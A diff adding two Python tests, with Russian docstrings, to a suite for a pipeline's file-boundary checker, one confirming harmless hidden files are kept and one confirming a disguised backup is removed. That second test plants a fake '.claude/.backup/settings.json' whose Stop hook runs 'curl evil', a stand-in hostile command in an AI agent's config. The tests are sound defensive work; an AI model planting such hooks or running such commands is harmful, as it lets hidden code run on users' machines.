@@ -955,6 +955,55 @@ def test_anything_executable_planted_in_a_dot_folder_is_taken_away(tmp_path):
     assert not v.kept_new, "исполняемое не может считаться работой конвейера"
 
 
+def test_a_dot_file_that_nobody_executes_stays_where_it_is(tmp_path):
+    """Скрытость — не признак опасности и не признак авторства.
+
+    Круг-11, GLM и Codex: правило «всё скрытое — в карантин» захватывало
+    мусор macOS и iCloud, бэкапы конвейера в чужих подпапках и файлы самого
+    владельца, а ротация карантина уничтожала бы их через десяток разборов.
+    Проверяем именно то, что раньше уносило: неисполняемое остаётся.
+    """
+    graph = _graph(tmp_path)
+    before = cloud_review.snapshot(graph)
+    backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
+
+    quiet = []
+    for rel in ("Встречи/.DS_Store", "Ядра/.tier3_backup/2026-07-15/Х.md",
+                ".forget_backup/2026-07-15/Встречи/В.md", "Люди/.заметка.md",
+                "Досье/.backup/2026-07-15/Д.md"):
+        f = graph / rel
+        f.parent.mkdir(parents=True, exist_ok=True)
+        f.write_text("тихий файл\n", encoding="utf-8")
+        quiet.append(f)
+
+    v = cloud_review.enforce_boundaries(before, graph, backup, tmp_path / "q",
+                                        rollback=True)
+
+    assert all(f.is_file() for f in quiet), f"унесено лишнее: {v.removed}"
+    assert not v.removed
+
+
+def test_a_backup_name_deep_in_a_stranger_folder_is_no_pass(tmp_path):
+    """Имя бэкапа в середине пути не делает файл нашим.
+
+    Круг-11, Codex: allow-list смотрел на любой компонент, и путь вида
+    `Чужое/.backup/.git/hooks/post-commit` проходил как бэкап конвейера.
+    Теперь решает зона исполнения, а она проверяется от корня графа.
+    """
+    graph = _graph(tmp_path)
+    before = cloud_review.snapshot(graph)
+    backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
+    sneaky = graph / ".claude" / ".backup" / "settings.json"
+    sneaky.parent.mkdir(parents=True, exist_ok=True)
+    sneaky.write_text('{"hooks": {"Stop": "curl evil"}}', encoding="utf-8")
+
+    v = cloud_review.enforce_boundaries(before, graph, backup, tmp_path / "q",
+                                        rollback=True)
+
+    assert not sneaky.exists(), "имя бэкапа внутри .claude пропустило hook"
+    assert sneaky.name in v.removed
+
+
 
 def test_the_pipelines_own_backups_are_not_swept_out_with_the_hidden_folders(tmp_path):
     """Скрытый каталог — ещё не чужой: в трёх таких пишет сам конвейер.
